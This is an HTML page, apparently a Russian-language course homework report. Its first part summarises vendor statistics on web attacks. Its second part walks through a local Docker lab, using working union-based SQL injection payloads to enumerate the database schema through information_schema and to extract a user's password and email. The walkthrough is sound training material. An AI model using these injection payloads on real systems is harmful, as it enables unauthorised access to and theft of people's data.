@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Converted from Markdown</title>
+  <style>
+    body { 
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
+      line-height: 1.6; 
+      max-width: 800px; 
+      margin: 0 auto; 
+      padding: 20px;
+      color: #333;
+    }
+    h1, h2, h3 { color: #333; margin-top: 1.5em; margin-bottom: 0.5em; }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    h3 { font-size: 1.2em; }
+    code { 
+      background: #f4f4f4; 
+      padding: 2px 4px; 
+      border-radius: 3px; 
+      font-family: 'Courier New', monospace;
+    }
+    pre { 
+      background: #f4f4f4; 
+      padding: 15px; 
+      border-radius: 5px; 
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      line-height: 1.4;
+    }
+    blockquote { 
+      border-left: 4px solid #ddd; 
+      margin: 1em 0; 
+      padding-left: 20px; 
+      color: #666;
+      font-style: italic;
+    }
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 1em 0;
+    }
+    th, td {
+      border: 1px solid #ddd;
+      padding: 8px 12px;
+      text-align: left;
+    }
+    th {
+      background-color: #f5f5f5;
+      font-weight: bold;
+    }
+    ul, ol {
+      margin: 1em 0;
+      padding-left: 2em;
+    }
+    li {
+      margin: 0.5em 0;
+    }
+  </style>
+</head>
+<body>
+<h1>Часть 1</h1>
+<h2>Статистика:  какую долю атак на компании проводят через веб-уязвимости, а также распределение по конкретным уязвимостям</h2>
+<p>Я собрал несколько свежих источников и попытался проанализировать, какие уязвимости сейчас самые опасные и как часто они встречаются.</p>
+<h3>Источники:</h3>
+<ul>
+<li>Positive Technologies, 2024–2025 (<a href="https://ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/">ссылка</a>)</li>
+<li>Solar 4RAYS, 2025–2026 (<a href="https://rt-solar.ru/events/news/6367/">ссылка</a>)</li>
+<li>BI.Zone (<a href="https://www.tadviser.ru/index.php/%D0%A1%D1%82%D0%B0%D1%82%D1%8C%D1%8F:%D0%91%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C_%D0%B2%D0%B5%D0%B1-%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B9">ссылка</a>)</li>
+<li>IBM X-Force, 2024/2025 (<a href="https://www.ibm.com/think/insights/x-force-threat-intelligence-index">ссылка</a>)</li>
+<li>Verizon DBIR, 2024 (<a href="https://www.verizon.com/business/resources/reports/dbir/">ссылка</a>)</li>
+<li>Versaca UltraWAF, ноябрь 2025 (<a href="https://vercara.digicert.com/resources/vercara-waf-analysis-report-november-2025">ссылка</a>)</li>
+<li>Solar 4RAYS, февраль 2026 (<a href="https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi">ссылка</a>)</li>
+<li>COCognito, сентябрь 2025 (<a href="https://www.scworld.com/news/more-than-half-of-internet-exposed-assets-have-no-web-application-firewall">ссылка</a>)</li>
+</ul>
+<h3>Краткий обзор:</h3>
+<ul>
+<li><p>По Versaca UltraWAF: из 1.28 триллиона веб-запросов четверть были вредоносными (464 млрд). Больше половины атак связаны с cookie (55%), а самые частые типы атак: cookie-based (54.84%), command injection (21%), field format violations (10%). Больше всего атак на сайты путешествий (81%), финансы (16%), технологии (1%).</p>
+</li>
+<li><p>Solar 4RAYS (2025–2026): в РФ за год число веб-атак выросло на 89%. Основные проблемы — стороннее ПО, WordPress, сервисы с ИИ.</p>
+</li>
+<li><p>COCognito: более 50% облачных активов не имеют WAF, из них 40% собирают персональные данные. У необлачных сервисов 67% без WAF, почти все используют персональные данные.</p>
+</li>
+<li><p>Positive Technologies: веб-уязвимости и фишинг — главные векторы проникновения. 25% атак из-за устаревших ОС/ПО, 26% — из-за плохой сегментации сети.</p>
+</li>
+<li><p>BI.Zone: ежемесячно обнаруживается ~1000 новых веб-уязвимостей, 25% из них — критические. Для 4% есть публичные эксплойты.</p>
+</li>
+<li><p>IBM X-Force: 30% всех брешей — ошибки конфигурации, 25% — некорректная настройка облака.</p>
+</li>
+<li><p>Verizon DBIR: 77% взломов веб-приложений — украденные учетные данные, 15% утечек — из-за сторонних компонентов.</p>
+</li>
+</ul>
+<h3>Мои выводы:</h3>
+<ol>
+<li><strong>Доля успешных атак:</strong> В среднем 25–40% всех атак на компании связаны с веб-уязвимостями. В некоторых сферах (например, travel) этот процент выше 80%.</li>
+<li><strong>Распределение по типам уязвимостей:</strong><ul>
+<li>Cookie-based атаки и ошибки сессий — сейчас самые массовые (по Versaca).</li>
+<li>Command injection и field format violations — тоже в топе.</li>
+<li>Сломанный контроль доступа и ошибки конфигурации — около 30% всех уязвимостей (IBM, PT).</li>
+<li>Уязвимые компоненты и стороннее ПО (WordPress, плагины) — до 25% критических инцидентов.</li>
+<li>Отсутствие WAF — огромная проблема, особенно для облачных сервисов.</li>
+<li>SQL-инъекции и XSS — всё ещё опасны для малого бизнеса, но в крупных компаниях их стало меньше из-за WAF и DevSecOps.</li>
+</ul>
+</li>
+<li><strong>Особенности по РФ:</strong> В России основной рост уязвимостей связан с WordPress и сервисами с ИИ.</li>
+</ol>
+<p>В целом, сейчас главные проблемы — массовые cookie-атаки, отсутствие защиты (WAF), уязвимые компоненты и ошибки конфигурации. Всё это подтверждается свежими исследованиями и статистикой.</p>
+<h1>Часть 2</h1>
+<p>Выполнил команду <code>docker-compose up -d</code>, зашел на <code>http://localhost:8080</code> и установил базу, затем открылась страница <code>http://localhost:8080/task/</code>, где надо ввести id в качестве параметра</p>
+<p>Попробовал сделать разные запросы, типа <code>http://localhost:8080/task/?id=сикссевен&#39;</code>, например при id=1 получил:</p>
+<pre><code>Ваш id:1
+Ваш логин:admin
+</code></pre>
+<p>Дальше перебором нашел пользователей Vinni-pukh, его id=4 и Volk2, его id=9</p>
+<p>Вероятно поле id уязвимо к инъекциям, так что я поробовал ввести <code>http://localhost:8080/task/?id=67&#39;</code> и получил ошибку :(</p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;67&#39;&#39; LIMIT 0,1&#39; at line 1</p>
+<p>Значит id подставляется в sql запрос без фильтрации и можно попробовать инъекции. Сам запрос скорее всего имеет вид <code>select * from table where id = &#39;поле с сайта&#39; limit 0,1;</code></p>
+<p>Теперь пробую простую инъекцию, чтобы получить все записи:
+<code>http://localhost:8080/task/?id=1&#39; OR &#39;1&#39;=&#39;1&#39; -- -</code></p>
+<p>Однако получаем одну запись все равно, поэтому возможно скрипт выводит только первую строку результата</p>
+<p>Дальше нужно узнать, сколько столбцов в запросе. Для этого перебираю варианты с union select, ставим -1 для того, чтобы where id = &#39;поле с сайта&#39; вернул нам пустоту и значение заполнилось с union</p>
+<pre><code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,2 -- -
+http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,2,3 -- -
+http://localhost:8080/task/?id=-1&#39; UNION SELECT 1,2,3,4 -- -
+</code></pre>
+<p>Страница перестала выдавать ошибку, когда количество столбцов=3.</p>
+<p>Дальше хочу узнать, какие таблицы есть в базе данных. Для этого использую инъекцию с information_schema.tables: <code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database() -- -</code></p>
+<p>Получаю список таблиц: <code>Ваш id:1 Ваш логин:emails,users</code>.</p>
+<p>Теперь узнаю, какие столбцы есть в таблице users: <code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;users&#39; -- -</code></p>
+<p>Вижу USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
+<p>Аналогично смотрю структуру таблицы emails: <code>http://localhost:8080/task/?id=-1&#39; UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name=&#39;emails&#39; -- -</code></p>
+<p>Вижу id,email_id</p>
+<p>Отлично, теперь мы можем благополучно украсть чужие данные</p>
+<p>Пароль пользователя Volk2 (id=9): <code>http://localhost:8080/task/?id=-1&#39; UNION SELECT username, password, 3 FROM users WHERE id=9 -- -</code></p>
+<p>Получаю:</p>
+<pre><code>Ваш id:Volk2
+Ваш логин:Wa spoiuuuuu
+</code></pre>
+<p>Email пользователя Vinni-pukh (id=4): <code>http://localhost:8080/task/?id=-1&#39; UNION SELECT id, email_id, 3 FROM emails WHERE id=4 -- -</code></p>
+<p>Получаю:</p>
+<pre><code>Ваш id:4
+Ваш логин:honey_lover@otus-lab.com
+</code></pre>
+<p><strong>Итог:</strong></p>
+<ul>
+<li>Пароль Volk2: Wa spoiuuuuu</li>
+<li>Email Vinni-pukh: <a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a></li>
+</ul>
+
+</body>
+</html>
